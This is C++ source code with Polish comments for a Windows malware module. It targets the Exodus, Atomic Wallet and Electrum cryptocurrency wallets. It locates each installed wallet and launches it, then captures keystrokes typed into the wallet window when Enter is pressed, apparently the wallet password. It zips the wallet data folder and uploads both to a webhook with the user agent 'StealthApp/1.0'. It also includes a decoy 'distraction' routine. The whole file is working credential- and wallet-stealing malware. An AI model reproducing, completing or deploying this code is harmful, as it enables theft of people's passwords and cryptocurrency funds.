#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <shlobj.h>
#include <psapi.h>
#include <winhttp.h>
#include <sstream>
#include <shlwapi.h>
#include <algorithm>
#include <cmath>
#include <cctype>
#include <mutex>
#include <ctime>
#include <shldisp.h>
#include <map>
#include <array>
#include <memory> // Dla std::shared_ptr
#include <atlbase.h> // Dla CComVariant

#include "common.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")

// --- Zmienne globalne modułu ---
const std::wstring g_exodusProcessName = L"Exodus.exe";
bool g_dataSent = false;


// --- Funkcje pomocnicze ---
std::string wstringToString_filewallet(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Nowa funkcja rozpraszająca
void performFileWalletDistractions(std::shared_ptr<std::array<double, 10>> calcArray) {
    if (!calcArray) return;
    for (int i = 0; i < 5; i++) {
        double val = GetTickCount() * (i + 1);
        val = fmod(tan(val), 1000.0);
        (*calcArray)[i] = val;
    }
}


// --- Deklaracje funkcji wewnętrznych ---
void sendData(const std::string& capturedText, const FileWallet& wallet);
static bool ZipWalletDataViaShell(const std::wstring& folderPath, const std::string& walletName, std::wstring& outZipPath);


// --- Główna funkcja logiki dla portfeli plikowych ---
void startFileWalletLogic(const std::vector<FileWallet>& foundWallets) {
    logToFile("[FileWallet] Moduł logiki uruchomiony dla " + std::to_string(foundWallets.size()) + " portfeli.");

    for (const auto& wallet : foundWallets) {
        // Uruchomienie dedykowanego wątku dla każdego portfela
        std::thread([wallet]() {
            logToFile("[FileWallet] Dedykowany wątek uruchomiony dla: " + wallet.name);

            // Krok 1: Sprawdź ścieżkę i uruchom proces portfela
            if (wallet.exe_path.empty() || !PathFileExistsW(wallet.exe_path.c_str())) {
                logToFile("[FileWallet] Nie znaleziono pliku wykonywalnego dla " + wallet.name + ". Nie można uruchomić monitorowania.");
                return;
            }

            logToFile("[FileWallet] Uruchamianie procesu dla " + wallet.name + " z: " + wstringToString_filewallet(wallet.exe_path));
            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;

            DWORD targetPID = 0; // Zmienna do przechowywania PID naszego celu
            const wchar_t* targetExeName = PathFindFileNameW(wallet.exe_path.c_str());

            if (CreateProcessW(wallet.exe_path.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                logToFile("[FileWallet] Proces " + wallet.name + " uruchomiony pomyślnie. PID: " + std::to_string(pi.dwProcessId));
                targetPID = pi.dwProcessId; // Zapisz PID uruchomionego procesu
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else {
                logToFile("[FileWallet] BŁĄD: Nie udało się uruchomić " + wallet.name + ". Kod błędu: " + std::to_string(GetLastError()));
                return;
            }

            if (targetPID == 0) {
                logToFile("[FileWallet] BŁĄD: Nie udało się uzyskać PID dla " + wallet.name);
                return;
            }

            getGlobalKeystrokeBuffer(true); // Wyczyść bufor na start dla tego wątku

            bool handled = false;
            while (!handled) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));

                HWND foreground = GetForegroundWindow();
                if (!foreground) continue;

                DWORD foregroundPID;
                GetWindowThreadProcessId(foreground, &foregroundPID);

                bool isTargetProcess = (foregroundPID == targetPID);

                // Dodatkowe sprawdzenie po nazwie procesu, jeśli PID się nie zgadza
                // To obsługuje przypadki, gdy proces startowy uruchamia inny proces główny (np. Electrum)
                if (!isTargetProcess && targetExeName && *targetExeName) {
                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, foregroundPID);
                    if (hProc) {
                        wchar_t processPath[MAX_PATH];
                        if (GetModuleFileNameExW(hProc, NULL, processPath, MAX_PATH)) {
                            const wchar_t* foregroundExeName = PathFindFileNameW(processPath);
                            if (foregroundExeName) {
                                // Sprawdzenie standardowe
                                if (_wcsicmp(foregroundExeName, targetExeName) == 0) {
                                    isTargetProcess = true;
                                }
                                // Specjalna obsługa dla Electrum:
                                // Sprawdź, czy nazwa procesu zaczyna się od "electrum"
                                else if (wallet.name == "Electrum" && wcsstr(foregroundExeName, L"electrum") == foregroundExeName) {
                                    logToFile("[FileWallet] Wykryto proces potomny Electrum: " + wstringToString_filewallet(foregroundExeName));
                                    isTargetProcess = true;
                                    // Opcjonalnie: zaktualizuj targetPID, aby uniknąć powtarzania tego sprawdzenia
                                    targetPID = foregroundPID;
                                }
                            }
                        }
                        CloseHandle(hProc);
                    }
                }

                if (isTargetProcess) {
                    if (GetAsyncKeyState(VK_RETURN) & 0x0001) {
                        std::string capturedText = getGlobalKeystrokeBuffer(true);
                        if (!capturedText.empty()) {
                            logToFile("[FileWallet] Enter w oknie " + wallet.name + ". Przechwycono: " + capturedText);
                            std::thread(sendData, capturedText, wallet).detach();
                            handled = true;
                        }
                    }
                }
            }
            logToFile("[FileWallet] Wątek monitorujący dla " + wallet.name + " zakończył pracę.");
            }).detach();
    }
}


// --- Implementacje funkcji ---
std::vector<FileWallet> checkFileWallets(
    const std::wstring& roamingAppData,
    const std::wstring& localAppData,
    std::wstring& outExodusPath,
    const std::wstring& exodusWalletPathFragment,
    const std::wstring& exodusExePathFragment,
    const std::wstring& atomicPathFragment,
    const std::wstring& electrumPathFragment,
    std::wstring& outAtomicExePath,
    std::wstring& outElectrumExePath
) {
    std::vector<FileWallet> foundWallets;
    logToFile("[FileWallet] Rozpoczynanie sprawdzania portfeli plikowych...");

    outExodusPath = localAppData + exodusExePathFragment;
    std::wstring exodusWalletPath = roamingAppData + exodusWalletPathFragment;
    if (PathFileExistsW(outExodusPath.c_str()) && PathFileExistsW(exodusWalletPath.c_str())) {
        logToFile("[FileWallet] Znaleziono portfel Exodus.");
        foundWallets.push_back({ "Exodus", exodusWalletPath, outExodusPath });
    }

    std::wstring atomicPath = roamingAppData + atomicPathFragment;
    if (PathFileExistsW(atomicPath.c_str())) {
        logToFile("[FileWallet] Znaleziono portfel Atomic.");
        outAtomicExePath = findExePath(L"Atomic Wallet.exe");
        foundWallets.push_back({ "Atomic Wallet", atomicPath, outAtomicExePath });
    }

    std::wstring electrumPath = roamingAppData + electrumPathFragment;
    if (PathFileExistsW(electrumPath.c_str())) {
        logToFile("[FileWallet] Znaleziono portfel Electrum.");
        outElectrumExePath = findExePath(L"electrum-*.exe");
        foundWallets.push_back({ "Electrum", electrumPath, outElectrumExePath });
    }

    if (foundWallets.empty()) {
        logToFile("[FileWallet] Nie znaleziono żadnych portfeli plikowych.");
    }
    return foundWallets;
}


static bool CreateEmptyZip(const std::wstring& zipPath) {
    HANDLE h = CreateFileW(zipPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    unsigned char eocd[22] = { 'P','K', 5,6, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0 };
    DWORD written = 0;
    BOOL ok = WriteFile(h, eocd, sizeof(eocd), &written, NULL);
    CloseHandle(h);
    return ok && written == sizeof(eocd);
}

static bool ZipWalletDataViaShell(const std::wstring& folderPath, const std::string& walletName, std::wstring& outZipPath) {
    wchar_t tmpPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmpPath)) return false;
    wchar_t tmpFile[MAX_PATH];
    if (!GetTempFileNameW(tmpPath, L"fwz", 0, tmpFile)) return false;
    outZipPath = tmpFile;
    DeleteFileW(outZipPath.c_str());
    outZipPath += L".zip";
    if (!CreateEmptyZip(outZipPath)) return false;

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr)) return false;

    IShellDispatch* pShell = nullptr;
    hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pShell);
    if (FAILED(hr) || !pShell) { CoUninitialize(); return false; }

    Folder* pZip = nullptr;
    VARIANT vZip; VariantInit(&vZip); vZip.vt = VT_BSTR; vZip.bstrVal = SysAllocString(outZipPath.c_str());
    hr = pShell->NameSpace(vZip, &pZip);
    VariantClear(&vZip);
    if (FAILED(hr) || !pZip) { pShell->Release(); CoUninitialize(); return false; }

    Folder* pSrc = nullptr;
    VARIANT vSrc; VariantInit(&vSrc); vSrc.vt = VT_BSTR; vSrc.bstrVal = SysAllocString(folderPath.c_str());
    hr = pShell->NameSpace(vSrc, &pSrc);
    VariantClear(&vSrc);
    if (SUCCEEDED(hr) && pSrc) {
        FolderItems* pItems = nullptr;
        hr = pSrc->Items(&pItems);
        if (SUCCEEDED(hr) && pItems) {
            pZip->CopyHere(CComVariant(pItems), CComVariant(16 | 4));
            Sleep(2000); // Daj czas na kopiowanie
            pItems->Release();
        }
        pSrc->Release();
    }

    pZip->Release();
    pShell->Release();
    CoUninitialize();
    return true;
}


void sendData(const std::string& capturedText, const FileWallet& wallet) {
    try {
        logToFile("[FileWallet] Wątek sendData uruchomiony dla " + wallet.name);
        std::wstring zipPath;
        bool haveZip = ZipWalletDataViaShell(wallet.path, wallet.name, zipPath);

        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::string contentTypeHeader = "Content-Type: multipart/form-data; boundary=" + boundary;

        std::stringstream body_ss;
        body_ss << "--" << boundary << "\r\n";
        body_ss << "Content-Disposition: form-data; name=\"payload_json\"\r\n";
        body_ss << "Content-Type: application/json\r\n\r\n";
        body_ss << "{ \"content\": null, \"embeds\": [{ \"title\": \"" + wallet.name + " Capture\", \"color\": 3447003, \"fields\": [{ \"name\": \"Captured Text\", \"value\": \"||" << capturedText << "||\", \"inline\": false }] }], \"attachments\": [] }\r\n";

        std::vector<char> requestBody;
        std::string partStart = body_ss.str();
        requestBody.insert(requestBody.end(), partStart.begin(), partStart.end());

        if (haveZip) {
            std::ifstream zf(zipPath, std::ios::binary | std::ios::ate);
            if (zf.is_open()) {
                std::streamsize zsize = zf.tellg(); zf.seekg(0, std::ios::beg);
                std::vector<char> zbuf(static_cast<size_t>(zsize));
                if (zsize > 0 && zf.read(zbuf.data(), zsize)) {
                    std::string filename = wallet.name + "_wallet.zip";
                    std::replace(filename.begin(), filename.end(), ' ', '_');

                    std::stringstream filePart;
                    filePart << "--" << boundary << "\r\n";
                    filePart << "Content-Disposition: form-data; name=\"file1\"; filename=\"" << filename << "\"\r\n";
                    filePart << "Content-Type: application/zip\r\n\r\n";
                    std::string fileHeader = filePart.str();
                    requestBody.insert(requestBody.end(), fileHeader.begin(), fileHeader.end());
                    requestBody.insert(requestBody.end(), zbuf.begin(), zbuf.end());
                    requestBody.insert(requestBody.end(), { '\r', '\n' });
                }
                zf.close();
            }
        }

        std::string endBoundary = "\r\n--" + boundary + "--\r\n";
        requestBody.insert(requestBody.end(), endBoundary.begin(), endBoundary.end());

        URL_COMPONENTSW urlComp; wchar_t hostName[256], urlPath[2048];
        memset(&urlComp, 0, sizeof(urlComp)); urlComp.dwStructSize = sizeof(urlComp);
        urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256; urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 2048;
        std::wstring wWebhookUrl(getWebhookUrl().begin(), getWebhookUrl().end());
        if (!WinHttpCrackUrl(wWebhookUrl.c_str(), (DWORD)wWebhookUrl.length(), 0, &urlComp)) { logToFile("[FileWallet] KRYTYCZNY BŁĄD: WinHttpCrackUrl"); if (!zipPath.empty()) DeleteFileW(zipPath.c_str()); return; }

        HINTERNET hSession = WinHttpOpen(L"StealthApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);

        std::wstring wContentType(contentTypeHeader.begin(), contentTypeHeader.end());
        WinHttpAddRequestHeaders(hRequest, wContentType.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, requestBody.data(), (DWORD)requestBody.size(), (DWORD)requestBody.size(), 0)) {
            WinHttpReceiveResponse(hRequest, NULL); logToFile("[FileWallet] Dane dla " + wallet.name + " wysłane pomyślnie.");
        }
        else { logToFile("[FileWallet] BŁĄD: WinHttpSendRequest dla " + wallet.name + ": " + std::to_string(GetLastError())); }

        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
        if (!zipPath.empty()) DeleteFileW(zipPath.c_str());

    }
    catch (...) {
        logToFile("[FileWallet] BŁĄD: Nieznany wyjątek w sendData dla " + wallet.name);
    }
}

static bool FindFile(const std::wstring& dir, const std::wstring& filePattern, std::wstring& foundPath) {
    std::wstring searchPath = dir + L"\\" + filePattern;
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            foundPath = dir + L"\\" + findData.cFileName;
            FindClose(hFind);
            return true;
        }
        FindClose(hFind);
    }

    std::wstring dirSearchPath = dir + L"\\*";
    hFind = FindFirstFileW(dirSearchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
                if (FindFile(dir + L"\\" + findData.cFileName, filePattern, foundPath)) {
                    FindClose(hFind);
                    return true;
                }
            }
        }
    } while (FindNextFileW(hFind, &findData) != 0);

    FindClose(hFind);
    return false;
}

std::wstring findExePath(const std::wstring& exeName) {
    logToFile("[FileWallet] Rozpoczynanie wyszukiwania pliku: " + wstringToString_filewallet(exeName));

    std::vector<KNOWNFOLDERID> foldersToSearch = {
        FOLDERID_ProgramFiles,
        FOLDERID_ProgramFilesX86,
        FOLDERID_LocalAppData,
        FOLDERID_Desktop,
        FOLDERID_Downloads
    };

    for (const auto& folderId : foldersToSearch) {
        PWSTR pszPath = NULL;
        if (SUCCEEDED(SHGetKnownFolderPath(folderId, 0, NULL, &pszPath))) {
            std::wstring searchDir = pszPath;
            CoTaskMemFree(pszPath);

            logToFile("[FileWallet] Przeszukiwanie: " + wstringToString_filewallet(searchDir));
            std::wstring foundPath;
            if (FindFile(searchDir, exeName, foundPath)) {
                logToFile("[FileWallet] Znaleziono w: " + wstringToString_filewallet(foundPath));
                return foundPath;
            }
        }
    }

    logToFile("[FileWallet] Nie udało się znaleźć pliku wykonywalnego: " + wstringToString_filewallet(exeName));
    return L"";
}